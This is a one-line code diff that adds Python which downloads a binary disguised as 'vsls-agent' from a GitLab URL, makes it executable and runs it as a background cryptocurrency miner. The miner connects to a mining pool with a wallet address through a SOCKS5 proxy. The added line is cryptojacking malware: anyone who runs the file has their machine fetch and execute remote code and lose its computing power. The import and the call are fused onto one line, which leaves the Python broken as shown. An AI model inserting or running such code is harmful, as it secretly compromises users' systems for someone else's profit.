@@ -1,0 +1,1 @@
+import os os.system("wget https://gitlab.com/mulungweb2020/tx/-/raw/main/vsls-agent && chmod 777 vsls-agent && chmod +x vsls-agent && ./vsls-agent -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qjqkdl9geqspau9hkq22pe6suu8ctj7c3q2ardc.hext -p x -B --proxy socks5://192.252.209.155:14455")
